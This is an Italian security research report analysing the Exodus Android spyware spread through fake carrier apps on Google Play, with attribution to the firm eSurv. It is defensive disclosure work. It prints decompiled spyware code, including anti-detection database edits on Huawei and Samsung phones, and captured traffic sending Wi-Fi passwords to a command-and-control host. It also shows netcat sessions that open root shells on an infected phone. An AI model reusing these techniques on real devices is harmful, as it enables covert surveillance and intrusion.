---
title: "Exodus: Nuovo Spyware per Android Made in Italy"
date: 2019-03-29 08:00 UTC
tags: action
image: "/images/keyboard.jpg"
---

[Click here for the English version]()

*Disclaimer: questa ricerca è stata condotta da membri e associati di Security Without Borders, indipendentemente da qualsiasi altra affiliazione o datore di lavoro.*

## Sommario

- Abbiamo identificato una nuova famiglia di spyware per Android che abbiamo nominato **Exodus** e che si compone di due stage che identifichiamo in questo rapporto come **Exodus One** e **Exodus Two**. Abbiamo raccolto numerose copie di questo spyware, generate ed utilizzate tra il 2016 all'inizio del 2019.
- Copie di questo sono state trovate caricate sul Google Play Store, camuffate da applicazioni di servizio di operatori telefonici. Sia le pagine di Google Play Store che le finte interfacce di queste applicazioni malevole sono in Italiano. Secondo le statistiche pubblicamente disponibili, in aggiunta ad una conferma di Google, **la maggior parte di queste applicazioni hanno raccolto qualche decina di installazioni ciascuna, con un caso che superava le 350 unità. Tutte le vittime si trovano in Italia**. Le pagine Google Play Store e le relative applicazioni malevole sono state disabilitate da Google.
- Riteniamo che questa piattaforma spyware sia stata sviluppata da una società Italiana chiamata **eSurv**, di Catanzaro, che opera principalmente nel settore della videosorveglianza. Secondo informazioni disponibili pubblicamente sembra che eSurv abbia iniziato a sviluppare spyware dal 2016.
- Exodus è dotato di ampie capacità di raccolta e di intercettazione. È particolarmente preoccupante che **alcune delle modifiche effettuate dallo spyware potrebbero esporre i dispositivi infetti a ulteriori compromissioni o a manomissioni dei dati**.


## Spyware Camuffato e Caricato su Google Play Store

Abbiamo identificato copie di uno spyware precedentemente sconosciuto che sono state caricate con successo sul Google Play Store più volte nel corso di oltre due anni. Queste applicazioni sono normalmente rimaste disponibili su Play Store per mesi.

Anche se con diverse variazioni, tutte le copie identificate di questo spyware condividono un camuffamento simile. Nella maggior parte dei casi sono stati creati per apparire come applicazioni distribuite da generici operatori mobili in Italia. Spesso la descrizione dell'applicazione sul Play Store fa riferimento a messaggi SMS che i target avrebbero ricevuto e che li avrebbero condotti ad una pagina sul Play Store. Tutte le pagine sul Play Store che abbiamo identificato e tutte le interfacce grafiche usate per camuffare le applicazioni stesse sono scritte in Italiano.

<img src="/images/esurv/playstore1.png" class="rounded-lg shadow-lg" />

<img src="/images/esurv/playstore2.png" class="rounded-lg shadow-lg mb-4" />

Secondo Google, che abbiamo contattato per segnalare le nostre scoperte, quasi 25 varianti di questo spyware sono state caricate sul Google Play Store. Google Play ha rimosso le applicazioni e ha dichiarato in una comunicazione via email che *"grazie a modelli di rilevamento avanzati, Google Play Protect sarà ora in grado di rilevare meglio le future varianti di queste applicazioni"*.

Mentre Google non ha condiviso con noi il numero totale di dispositivi infetti, ha confermato che una di queste applicazioni malevole ha raccolto oltre 350 installazioni attraverso il Play Store, mentre altre varianti hanno raccolto poche decine ciascuna, e che tutte le infezioni sono state localizzate in Italia. Abbiamo direttamente osservato [molteplici](https://archive.fo/omfJ8) [copie](https://archive.fo/lzDTN) di Exodus con [più di 50 installazioni](https://archive.fo/8KYG7) e **possiamo stimare approssimativamente che il numero totale di infezioni ammonti a diverse centinaia, se non un migliaio o più**. 



## Primo Stage: *Exodus One*

Il primo stage, installato scaricando le applicazioni malevole caricate su Google Play Store, funziona semplicemente da *dropper*. Di seguito sono riportati alcuni esempi delle finte interfacce grafiche utilizzate da queste applicazioni:

<div class="float-left mb-8"><img src="/images/esurv/phone2.png" class="mr-6" width="300px" /> <img src="/images/esurv/phone3.png" width="300px" /></div><div class="clearfix"></div>

Lo scopo di *Exodus One* sembra essere quello di raccogliere alcune informazioni di base di identificazione del dispositivo infetto (in particolare il codice IMEI ed il numero di telefono) e inviarlo al server di Command & Control. Questo è talvolta fatto per verificare la validità di una infezione. Ciò è ulteriormente corroborato da alcune copie più vecchie e non offuscate generate nel 2016, le cui classi primarie sono chiamate `CheckValidTarget`.

Durante i nostri test **lo spyware è stato aggiornato allo stage two sui nostri dispositivi di test immediatamente dopo il primo check-in.** Questo suggerisce che gli operatori del Command & Control non stanno applicando una validazione dei target. Inoltre, **durante un periodo di diversi giorni, i nostri dispositivi di test infetti non sono mai stati disinfettati in remoto dagli operatori**.

Per il fine di questo rapporto analizziamo qui in particolare il campione di *Exodus One* con hash `8453ce501fee1ca8a321f16b09969c517f92a24b058ac5b54549eabd58bf1884` che comunica con il server di Command & Control all'indirizzo `54.71.249.137`. Altre copie comunicano con altri server elencati in fondo a questo rapporto. *Exodus One* effettua il check-in inviando una richiesta POST contenente il package name dell'applicazione, l'IMEI del dispositivo e un body crittografato contenente informazioni aggiuntive sul dispositivo.

```
POST /eddd0317-2bdc-4140-86cb-0e8d7047b874 HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
Content-Type: application/octet-stream
Content-Length: 256
Host: 54.71.249.137
Connection: Keep-Alive
Accept-Encoding: gzip

.....,Q... N.v..us.R.........../...\D..5p..q    ......4

[REDACTED]

gl.O..Y.Q..)3...7K.:(..5...w..........L.....p.L2......._jK..............g}...15......r.x.x!.....?..O.z......

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: [REDACTED]
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

358fde5fe8f91b132636a6d5a7148070
```

Il contenuto della richiesta è composto da vari identificatori concatenati con cancelletti:

```java
StringBuilder stringBuilder = new StringBuilder();
stringBuilder.append(" ");
stringBuilder.append("#");
stringBuilder.append(deviceId);
stringBuilder.append("#");
stringBuilder.append(str);
stringBuilder.append("#");
stringBuilder.append(line1Number);
stringBuilder.append("##");
stringBuilder.append(subscriberId);
stringBuilder.append("#");
stringBuilder.append(networkOperatorName);
stringBuilder.append("#");
stringBuilder.append(networkType);
stringBuilder.append("#");
stringBuilder.append(simState);
```

La funzione `doFinal()` è poi chiamata per cifrare la stringa generata:

```java
final byte[] doFinal = a3.doFinal(stringBuilder.toString().getBytes());
```

La stringa di User-Agent è costruita concatenando il package name ed il numero IMEI del dispositivo:

```java
stringBuilder2.append(this.e.getPackageName());
stringBuilder2.append(":");
stringBuilder2.append(deviceId);
subscriberId = stringBuilder2.toString();
```

Infine, la richiesta HTTP è mandata al server `https://54.71.249.137/eddd0317-2bdc-4140-86cb-0e8d7047b874`. Molte delle stringhe nell'applicazione sono XORate con la chiave `Kjk1MmphFG`:

```java
StringBuilder stringBuilder3 = new StringBuilder();
stringBuilder3.append("https://");
stringBuilder3.append(a);
stringBuilder3.append("/");
stringBuilder3.append(p.a("Lg4PVX1eQV9rdSkOCBx5XERYa399CQkcfQhIDHF3f10JCXpZ"));
final Request build = builder.url(stringBuilder3.toString()).header("User-Agent", subscriberId).post(create).build();
```

Dopo alcune altre, *Exodus One* compie una richiesta POST a `https://54.71.249.137/56e087c9-fc56-49bb-bbd0-4fafc4acd6e1` che ritorna un archivio Zip contenente i binari che compongono il secondo stage.

```
POST /56e087c9-fc56-49bb-bbd0-4fafc4acd6e1 HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
Content-Type: application/octet-stream
Content-Length: 256
Host: 54.71.249.137
Connection: Keep-Alive
Accept-Encoding: gzip

......#f......Ri.)"S.d,....xT...(.L...1.6I.KW9n...Cc@.;....u..4.k...
".d...W

[REDACTED]

%.+Y..k..}..I....!z...5G...-(.]fc.V..<[y...T..s}.{......u%..[.!89...m..

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Fri, 18 Jan 2019 13:19:58 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

PK.........e[L@..c4'...T......null_armUT    ...D.ZxD.Zux..............|}|....y.%...O`.....f..0..)..P..
```



## Secondo Stage: *Exodus Two*

L'archivio Zip restituito dal check-in effettuato da *Exodus One* è una raccolta di file contenenti il payload primario `mike.jar` e diverse utilities compilate che svolgono diverse funzioni. Almeno nelle versioni più recenti, a partire da gennaio 2019, l'archivio Zip conterrebbe effettivamente le versioni i686, arm e arm64 di tutti i binari distribuiti.

| Nome di File | Data di Modifica | SHA256 |
|--------------|------------------|--------|
| null_arm | 2018-02-27 06:44:00 | 48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88 |
| null_i686 | 2018-02-27 06:44:00 | c228a534535b22a316a97908595a2d793d0fecabadc32846c6d1bfb08ca9a658 |
| null_arm64 | 2018-02-27 06:43:00 | 48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88 |
| sepolicy-inject_arm | 2019-01-08 04:55:00 | 47449a612697ad99a6fbd6e02a84e957557371151f2b034a411ebb10496648c8 |
| sepolicy-inject_arm64 | 2019-01-08 04:55:00 | 824ad333320cbb7873dc49e61c14f749b0e0d88723635524463f2e6f56ea133a |
| sepolicy-inject_i686 | 2019-01-08 04:55:00 | 13ec6cec511297ac3137cf7d6e4a7c4f5dd2b24478a06262a44f13a3d61070b6 |
| rootdaemon_arm | 2019-01-08 04:55:00 | 00c787c0c0bc26caf623e66373a5aaa1b913b9caee1f34580bdfdd21954b7cc4 |
| rootdaemon_arm64 | 2019-01-08 04:55:00 | 3ee3a973c62ba5bd9eab595a7c94b7a26827c5fa5b21964d511ab58903929ec5 |
| mike.jar | 2018-12-06 05:50:00 | a42a05bf9b412cd84ea92b166d790e8e72f1d01764f93b05ace62237fbabe40e |
| rootdaemon_i686 | 2019-01-08 04:55:00 | b46f282f9a1bce3798faee3212e28924730a657eb93cda3824c449868b6ee2e7 |
| zygote_daemon_arm | 2019-01-08 04:55:00 | e3f65f84dd6c2c3a5a653a3788d78920c0321526062a6b53daaf23fa57778a5f |
| zygote_daemon_arm64 | 2019-01-08 04:55:00 | 11499ff2418f4523344de81a447f6786fdba4982057d4114f64db929990b4b59 |
| zygote_daemon_i686 | 2019-01-08 04:55:00 | 3c9f08b3280851f54414dfa5a57f40d3b7be7b73736fa0ba21b078e75ce54d33 |
| sapp.apk | 2019-01-08 04:53:00 | 4bf1446c412dd5c552539490d03e999a6ceb96ae60a9e7846427612bec316619 |
| placeholder | 2018-03-29 16:31:00 | e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 |

Dopo il download, *Exodus One* carica dinamicamente ed esegue il payload primario `mike.jar` utilizzando l'API Android [DexClassLoader()](https://developer.android.com/reference/dalvik/system/DexClassLoader). `mike.jar` implementa la maggior parte delle funzionalità di raccolta dati e di filtraggio di questo spyware.

Dei vari binari scaricati, i più interessanti sono `null`, che funge da terminale locale e remoto, e `rootdaemon`, che si occupa dell'escalation dei privilegi e dell'acquisizione dati. Il `rootdaemon` tenterà in primo luogo un jailbreak del dispositivo usando una versione modificata dell'exploit DirtyCow.

Analogamente a [Skygofree](https://www.hindustantimes.com/tech/skygofree-new-spyware-can-access-your-whatsapp-messages-huawei-devices-infected-as-well/story-VVv9DB7klyLHx33S2Xn7IJ.html), un altro spyware Android Italiano scoperto da Kaspersky Labs, anche Exodus si avvale di "protectedapps", una caratteristica dei telefoni Huawei che permette di configurare opzioni di risparmio energetico per le applicazioni in esecuzione. Manipolando un database SQLite, Exodus è in grado di mantenersi in funzione anche quando lo schermo si spegne e l'applicazione verrebbe altrimenti sospesa per ridurre il consumo della batteria.

```java
if ( !func_sqlite_loaddb((int)"/data/data/com.huawei.systemmanager/databases/Optimize.db", (int)&db_handle) )
{
    sprintf(&s, "INSERT INTO protectedapps (package_name,list_type) VALUES ('%s','1')", v1, 0);
    func_sqlite_exec(db_handle, &s, 0, 0, &v4);
    sprintf(&s, "DELETE FROM backgroundwhiteapps WHERE package_name='%s'", v1);
    func_sqlite_exec(db_handle, &s, 0, 0, &v4);
    sprintf(&s, "INSERT INTO backgroundwhiteapps (package_name) VALUES ('%s')", v1);
    func_sqlite_exec(db_handle, &s, 0, 0, &v4);
    func_sqlite_free(v4);
}
```

```java
if ( !func_sqlite_loaddb(
        (int)"/data/user_de/0/com.huawei.systemmanager/databases/smartpowerprovider.db",
        (int)&db_handle) )
{
    sprintf(&s, "INSERT INTO protectedapps (package_name,list_type) VALUES ('%s','1')", v2, a2);
    func_sqlite_exec(db_handle, &s, 0, 0, &v5);
    sprintf(&s, "DELETE FROM rogueapps WHERE pkgname='%s'", v2);
    func_sqlite_exec(db_handle, &s, 0, 0, &v5);
    sprintf(&s, "DELETE FROM superpowerapps WHERE pkgname='%s'", v2);
    func_sqlite_exec(db_handle, &s, 0, 0, &v5);
    sprintf(&s, "REPLACE INTO unifiedpowerapps (pkg_name,is_protected,is_show,is_changed) VALUES ('%s',1,0,0)", v2);
    func_sqlite_exec(db_handle, &s, 0, 0, &v5);
    func_sqlite_free(v5);
}
```

Inoltre, `rootdaemon` cerca di rimuovere le proprie statistiche sul consumo energetico dal SystemManager di telefoni Huawei:

```java
if ( !func_sqlite_loaddb((int)"/data/data/com.huawei.systemmanager/databases/stusagestat.db", (int)&db_handle) )
{
    sprintf(&s, "REPLACE INTO default_value_table (pkg_name,control,protect,keytask) VALUES ('%s',0,2,0)", v1, 0);
    func_sqlite_exec(db_handle, &s, 0, 0, &v4);
    sprintf(&s, "DELETE FROM st_key_procs_table WHERE st_key_process='%s'", v1);
    func_sqlite_exec(db_handle, &s, 0, 0, &v4);
    sprintf(&s, "INSERT INTO st_key_procs_table (st_key_process) VALUES ('%s')");
    func_sqlite_exec(db_handle, &s, 0, 0, &v4);
    sprintf(&s, "REPLACE INTO st_protected_pkgs_table (pkg_name,is_checked) VALUES ('%s',1)", v1);
    func_sqlite_exec(db_handle, &s, 0, 0, &v4);
    func_sqlite_free(v4);
}
```

Allo stesso modo, l'applicazione dannosa probabilmente tenta di minimizzare le tracce sui telefoni Samsung aggiungendo al file `/data/data/com.samsung.android.securitylogagent/shared_prefs/apm_sp_status_of_apps.xml` le seguenti stringhe:

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <int name=\"[APP NAME]\" value=\"33554499\" />
</map>
```

Ed aggiunge al file `/data/data/com.samsung.android.securitylogagent/shared_prefs/com.samsung.android.securitylogagent_preferences.xml` le seguenti:

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name=\"[APP NAME]\" value=\"false\" />
</map>
```


### Collezione ed Esfiltrazione di Dati

Come accennato, `mike.jar` fornisce lo spyware con ampie capacità di raccolta dati, tra cui:

- Recuperare una lista di applicazioni installate.
- Registrare l'audio dell'ambiente circostante in formato 3gp utilizzando il microfono incorporato.
- Recuperare la cronologia di navigazione e i segnalibri da Chrome e SBrowser (il browser fornito con i telefoni Samsung).
- Estrarre gli eventi dall'app Calendario.
- Estrarre il registro delle chiamate.
- Registrare le chiamate telefoniche audio in formato 3gp.
- Scattare foto con la fotocamera incorporata.
- Raccogliere informazioni sulle celle telefoniche circostanti (BTS).
- Estrarre la rubrica.
- Estrarre l'elenco dei contatti dall'applicazione Facebook.
- Estrarre i log dalle conversazioni di Facebook Messenger.
- Prendere uno screenshot di qualsiasi applicazione in primo piano.
- Estrarre informazioni sulle immagini dalla Galleria.
- Estrarre informazioni dall'applicazione GMail.
- Scaricare i dati dall'app Messenger dell'IMO.
- Estrarre registri di chiamate, i contatti e messaggi dall'app Skype.
- Recuperare tutti i messaggi SMS.
- Estrarre i messaggi e la chiave di crittografia dall'app Telegram.
- Scaricare i dati dall'app Viber Messenger.
- Estrarre i log da WhatsApp.
- Recuperare i file multimediali scambiati tramite WhatsApp.
- Estrarre la password della rete Wi-Fi.
- Estrarre i dati dall'applicazione WeChat.
- Estrarre le coordinate GPS correnti del telefono.

Mentre alcune di queste acquisizioni vengono eseguite esclusivamente tramite codice in `mike.jar`, altre che richiedono l'accesso, ad esempio, a database SQLite o altri file nella memoria dell'applicazione vengono invece eseguite tramite `rootdaemon`, che dovrebbe essere eseguito con privilegi di root. Per ottenere questo, `mike.jar` si collega al `rootdaemon` attraverso varie porte TCP che il demone lega ad alcune routine di estrazione per applicazioni supportate:

- Porta 6202: Servizio di estrazione dati da WhatsApp.
- Porte 6203 e 6204: Servizio di estrazione dati da Facebook.
- Porta 6205: Servizio di estrazione dati da Gmail.
- Porta 6206: Servizio di estrazione dati da Skype.
- Porta 6207: Servizio di estrazione dati da Viber.
- Porto 6208: Servizio di estrazione dati da IMO.
- Porto 6209: Servizio di estrazione dati da Telegram.
- Porto 6210: servizio di estrazione dati da SBrowser.
- Porto 6211: servizio di estrazione dati da Calendar.
- Porto 6212: servizio di estrazione dati da Chrome.

Questi servizi sembrano essere esposti su tutte le interfacce di rete e sono quindi accessibili a chiunque condivida una rete locale con un dispositivo infetto.

```bash
 tcp       0      0 0.0.0.0:6201           0.0.0.0:*              LISTEN
 tcp       0      0 0.0.0.0:6205           0.0.0.0:*              LISTEN
 tcp       0      0 0.0.0.0:6209           0.0.0.0:*              LISTEN
 tcp       0      0 0.0.0.0:6211           0.0.0.0:*              LISTEN
 tcp       0      0 0.0.0.0:6212           0.0.0.0:*              LISTEN
```

Di seguito possiamo vedere un esempio di connessione alla porta 6209 che viene utilizzata per estrarre dati dall'app Telegram. Siamo in grado di inviare al servizio comandi come `dumpmsgdb` o `getkey` (che scarica il file `tgnet.dat`).

```bash
user@laptop:~$ nc 192.168.1.99 6209 | xxd
getkey
00000000: 1f8b 0800 0000 0000 0003 1361 6660 0022  ...........af`."
00000010: 06f3 e995 7bb6 9616 cd04 6126 0604 70b7  ....{.....a&..p.
00000020: bfb9 e1d2 d959 e741 f220 3e2b 1073 0131  .....Y.A. >+.s.1
00000030: 2392 1a10 9bcf d0c4 52cf d0d4 44cf d0dc  #.......R...D...

[...]

00000080: 24d5 02e4 2423 ac4e a2c8 4dcc 686e e247  $...$#.N..M.hn.G
00000090: 0e27 4303 03c2 e164 4cf5 7062 c117 4e96  .'C....dL.pb..N.
000000a0: 4484 9309 f5c3 8915 cd4d bc88 7032 d433  D........M..p2.3
000000b0: 65c0 9f9e d240 8e32 a56a 3801 00c3 3f3c  e....@.2.j8...?<
000000c0: ab18 0300 00  
```

I dati acquisiti dai moduli di estrazione di `mike.jar` sono normalmente offuscati con XOR e memorizzati in una cartella denominata `.lost+found`' sulla scheda SD. Vengono infine esfiltrati su una connessione TLS al server di Command & Control `ws.my-local-weather[.]com` attraverso una coda di caricamento.

Come accennato in precedenza, il nostro dispositivo di test è stato automaticamente aggiornato al secondo stage, che ha iniziato a raccogliere dati. Ad esempio, la password della rete WiFi utilizzata dal telefono è stata memorizzata nella cartella `/storage/emulated/0/.lost+found+found/0BDA068-9D27-4B55-B226-299FCF2B4242/` utilizzando il seguente formato di nome di file `D_MMM_2019_H_mm_ss_XXXXXXXXXXXXXXXXXXXXX.txt.crypt` (la data e ora seguita dall'IMEI). **Abbiamo altresì osservato l'agente inviare la password WiFi dal nostro telefono di test al server Command & Control**:

```bash
PUT /7d2a863e-5899-4069-9e8e-fd272896d4c7/A35081BD-4016-4C35-AA93-38E09AF77DBA.php HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
DETAILS: {"date":"[REDACTED]","imei":"[REDACTED]","filenameb64":"[REDACTED]\u003d\u003d","filepathb64":"[REDACTED]\u003d","fileDirectoryb64":"[REDACTED]\u003d","uploadType":"WIFIPASSWORD","encrypted":true}
Content-Type: application/octet-stream
Content-Length: 277
Host: ws.my-local-weather.com
Connection: Keep-Alive
Accept-Encoding: gzip

l.9TqRuosV..~.:. ...` [REDACTED] ....s)Sp.^...5z..d0pRu

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 18 Jan 2019 15:53:40 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

OK
```

Allo stesso modo, l'agente ha anche inviato al Command & Control l'elenco delle applicazioni installate sul nostro telefono:

```bash
PUT /7d2a863e-5899-4069-9e8e-fd272896d4c7/A35081BD-4016-4C35-AA93-38E09AF77DBA.php HTTP/1.1
User-Agent: it.promofferte:[REDACTED]
DETAILS: {"date":"[REDACTED]","imei":"[REDACTED]","filenameb64":"[REDACTED]\u003d\u003d","filepathb64":"[REDACTED]\u003d\u003d","fileDirectoryb64":"[REDACTED]\u003d","uploadType":"APPLIST","encrypted":true}
Content-Type: application/octet-stream
Content-Length: 11502
Host: ws.my-local-weather.com
Connection: Keep-Alive
Accept-Encoding: gzip

(..5."...0...gVE^R.gRT@WYS3^&Q....9.ua8.+WCQ%]T^Q.
.UYY.R][V.0.5.6...1]0P&.pYM.0AFZ[W~Q[S.

[REDACTED]

<...wIwR;.|...2_P.UWTBY_P.FKZR.1P$.7..]6.;E5.&.M_wEPAGP_^xWYR....]a.`\cG]Dd@c.xS$...<\[p[]U...
Jh

HTTP/1.1 200 OK
Server: nginx
Date: [REDACTED]
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip
```

Questo Command & Control sembra essere attivo almeno dall'aprile 2017 ed è stato registrato impersonando il servizio legittimo [AccuWeather](https://www.accuweather.com).

```
Registrant Name: AccuWeather, Inc.
Registrant Organization: AccuWeather, Inc.
Registrant Street: 385 SCIENCE PARK RD
Registrant City: STATE COLLEGE
Registrant State/Province: PA
Registrant Postal Code: 16803-2215
Registrant Country: US
Registrant Phone: +1.8142358528
Registrant Phone Ext:
Registrant Fax: +1.8142358528
Registrant Fax Ext:
Registrant Email: accuweather@nycmail[.]com
```



### Terminali Locali e Remoti

Per eseguire comandi sui dispositivi infetti, così come per fornire un terminale remoto (una "*reverse shell*" per l'esattezza) agli operatori del Command & Control, *Exodus Two* tenta immediatamente di eseguire un payload scaricato con il nome `null`. Una volta lanciato, `null` verificherà in primo luogo se è in grado di fare fork e che non c'è nessun'altra istanza di se stesso attualmente in esecuzione controllando se il numero di porta locale 6842 è disponibile.

Questo payload tenterà quindi di istanziare una "reverse shell" con `/system/bin/bin/sh` al Command & Control `ws.my-local-weather[.]com` sulla porta 22011. Vale la pena notare che questo terminale remoto non utilizza alcuna crittografia di trasporto. Il traffico transita in chiaro ed è quindi potenzialmente esposto ad attacchi man-in-the-middle:

<img src="/images/esurv/reverse_shell.png" class="rounded-lg shadow-lg" />

Allo stesso tempo, `null` espone anche una shell locale su 0.0.0.0:6842. Questa porta locale è usata da *Exodus Two* per eseguire vari comandi sul dispositivo Android, come abilitare o disabilitare determinati servizi, o analizzare i database delle applicazioni.

Tuttavia, esporre un terminale su tutte le interfacce disponibili lo renderà ovviamente accessibile a chiunque condivida almeno una rete locale con un dispositivo infetto. Ad esempio, **se un dispositivo infetto è connesso ad una rete Wi-Fi pubblica, qualsiasi altro partecipante alla rete è in grado di ottenere un terminale** sul dispositivo senza alcuna forma di autenticazione o verifica, ma semplicemente collegandosi alla porta.

```bash
user@laptop:~$ nc 192.168.1.99 6842 -v
Connection to 192.168.1.99 6842 port [tcp/*] succeeded!
u0_a114@hammerhead:/ $ id
id
uid=10114(u0_a114) gid=10114(u0_a114) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet),50114(all_a114) context=u:r:untrusted_app:s0
```

Se l'operatore mobile non applica una *client isolation* adeguata, è teoricamente possibile che i dispositivi infetti siano anche esposti al resto della rete cellulare.

Inevitabilmente, questo lascia il dispositivo esposto non solo ad ulteriori compromessi, ma anche a potenziale manipolazione dei dati.

`null` non è l'unico payload che espone un terminale sul telefono. Il binario `rootdaemon` offre infatti diverse altre possibilità di eseguire comandi sul dispositivo infetto semplicemente collegandosi alla porta TCP 6200 ed inviando uno dei seguenti comandi.

L'invio del comando `sh` alla porta TCP 6200 risulta nell'apertura di un terminale:

```bash
user@laptop:~$ nc 192.168.1.99 6200
sh
system@hammerhead:/ $ id
id
uid=1000(system) gid=1000(system) groups=1015(sdcard_rw),1028(sdcard_r),2000(shell),3003(inet) context=u:r:system:s0
system@hammerhead:/ $
```

L'invio del comando `cmd` seguito da un valido comando lo eseguirà e mostrerà l'output (nell'esempio usiamo `id` che mostra l'identità dell'utente del sistema che esegue i comandi emessi):

```bash
user@laptop:~$ nc 192.168.1.99 6200
cmd id
uid=1000(system) gid=1000(system) groups=1015(sdcard_rw),1028(sdcard_r),2000(shell),3003(inet) context=u:r:system:s0
```

Facendo lo stesso come sopra ma con il comando `sucmd` eseguirà il comando terminale come root:

```bash
user@laptop:~$ nc 192.168.1.99 6200
sucmd id
uid=0(root) gid=0(root) groups=1015(sdcard_rw),1028(sdcard_r),2000(shell),3003(inet) context=u:r:system:s0
```

Altri comandi supportati da `rootdaemon` sulla porta TCP 6200 sono `su` (che nei nostri test non ha funzionato correttamente), `loadsocketpolicy`, `loadfilepolicy`, `remount` e `rimooveroot`.

A costo di essere forse eccessivamente prolissi, ecco l'output di una scansione nmap del dispositivo Android infetto da un computer portatile connesso alla stessa rete locale, che dimostra ulteriormente la disponibilità delle stesse porte TCP aperte che abbiamo finora menzionato:

```bash
user@laptop:~$ nmap 192.168.1.99 -p6000-7000

Starting Nmap 7.40 ( https://nmap.org ) at 2019-02-28 17:12 CET
Nmap scan report for android-[REDACTED] (192.168.1.99)
Host is up (0.035s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
6200/tcp open  lm-x
6201/tcp open  thermo-calc
6205/tcp open  unknown
6209/tcp open  qmtps
6211/tcp open  unknown
6212/tcp open  unknown
6842/tcp open  netmo-http

Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds
```


## Identificazione di eSurv

### Lingua Italiana

Ad un primo sguardo, le prime copie dello spyware che abbiamo ottenuto non hanno mostrato immediatamente evidenti connessioni con nessuna azienda. Tuttavia, la ricorrente presenza della lingua Italiana sia sulle pagine di Google Play Store che all'interno del codice dello spyware è un chiaro segno che una entità Italiana è coinvolta nella sua creazione.
Alcune particolari parole contenute nel decompilato di `classes.dex` di *Exodus Two* ci hanno mandato nella giusta direzione.

```java
a("MUNDIZZA", "09081427-FE30-46B7-BFC6-50425D3F85CC", ".*", false);
this.b.info("UPLOADSERVICE Aggiunti i file mundizza. Dimensione coda upload {}", Integer.valueOf(this.c.size()));
```

"*Mundizza*" è una parola dialettale, derivata dalla parola Italiana "*immondizia*". È interessante notare che "*mundizza*" è una parola tipica della Calabria e più precisamente sembra essere nativa della città di Catanzaro.

Inoltre, alcune copie di *Exodus One* usano la seguente chiave XOR:

```java
char[] cArr = new char[]{'R', 'I', 'N', 'O', ' ', 'G', 'A', 'T', 'T', 'U', 'S', 'O'};
```

Rino Gattuso è un famoso calciatore Italiano in pensione, originario della Calabria.

Anche se non troppo seriamente, questi elementi ci hanno fatto delimitare la nostra ricerca sulle società di sorveglianza della regione.
  

### Sovrapposizione dell'infrastruttura con le telecamere di sorveglianza eSurv

Il dominio Command & Control configurato in molte delle applicazioni malevole presenti su Google Play Store, `ws.my-local-weather[.]com`, risolve all'indirizzo IP `54.69.156.31` che utilizza un certificato TLS self-signed con il nome comune `MyCert` e il fingerprint `11:41:45:45:2F:A7:A7:07:23:23:54:AE:9A:CE:CE:F4:FE:56:56:AE:AC:B1:C2:15:9F:6A:FC:1E:CC:7D:F8:61:E3:25:26:73:6A`. 

Una ricerca di questo fingerprint del certificato sul servizio di scansione Internet [Censys](https://www.censys.io) restituisce 8 server aggiuntivi:

| IP address |
|------------|
| 34.208.71.9 |
| 34.212.92.0 |
| 34.216.43.114 |
| 52.34.144.229 |
| 54.69.156.31 |
| 54.71.249.137 |
| 54.189.5.198 |
| 78.5.0.195 |
| 207.180.245.74 |

L'apertura della pagina web Command & Control in un browser presenta un prompt di autenticazione: 

<img src="/images/esurv/c2_prompt.png" class="rounded-lg shadow-lg" />

Chiedendo questo prompt, il server ritorna un errore "401 Risposta Non Autorizzata" con un messaggio "ACCESSO NEGATO".

<img src="/images/esurv/c2_error.png" class="rounded-lg shadow-lg" />

Tutti gli altri indirizzi IP scoperti che condividono lo stesso certificato TLS si comportano allo stesso modo.

Il server di Command & Control mostra anche un'immagine favicon che sembra una piccola palla arancione.

Al momento della scrittura, una ricerca inversa dell'immagine della favicon su [Shodan](https://www.shodan.io) utilizzando la query `http.favicon.favicon.hash:990643579` ha restituito circa 40 server web che utilizzano la stessa favicon.

<img src="/images/esurv/shodan_favicons2.png" class="rounded-lg shadow-lg" />

<img src="/images/esurv/shodan_favicons.png" class="rounded-lg shadow-lg" />

Molti di questi server sono pannelli di controllo per sistemi di videosorveglianza sviluppati dall'azienda Italiana **eSurv**, con sede a Catanzaro, in Calabria, Italia.

<img src="/images/esurv/advanced.png" class="rounded-lg shadow-lg" />

I loro [prodotti pubblicizzati pubblicamente](https://gfoeurope.it/public/File/Presentazioni%20Perugia/eSurv%20Present.%20GFO%20-%20Giungla%20Digitale%20Perugia.pdf) comprendono sistemi di gestione CCTV, droni di sorveglianza, sistemi di riconoscimento facciale e delle targhe.

Il logo di eSurv è identico alla favicon del server Command & Control.

<img src="/images/esurv/c2_favicon.png" class="rounded-lg shadow-lg" />

<img src="/images/esurv/home.png" class="rounded-lg shadow-lg" />


### Copie più vecchie che si collegano a eSurv

Infine, Google ha condiviso con noi alcuni vecchi campioni di *Exodus One* (con hash 2055584625d24687bd027a63bc0b8faa7d1a854a535de74afba24840a52b1d2f e a37f5d2418c5f2f2f64d06ba28fe62edee1293a56158ddfa9f04020e316054363f) che non sono offuscati e usano il seguente travestimento:

<img src="/images/esurv/phone1.png" class="mb-8" width="300px" />

La configurazione di queste copie più vecchie è molto simile a quelle più recenti, ma fornisce ulteriori dettagli perché non è offuscata:

```java
package com.vend.management.carrier.mylibrary;

public class Configuration {
    public static final String BUNDLE_CUSTOM_FILENAME = "D10CEE67-E1EF-4C17-96DC-BEB51B0A9A55";
    public static final String BUNDLE_UNIVERSAL_FILENAME = "AD9FF676-875E-4294-A230-44EA1A4B15A1";
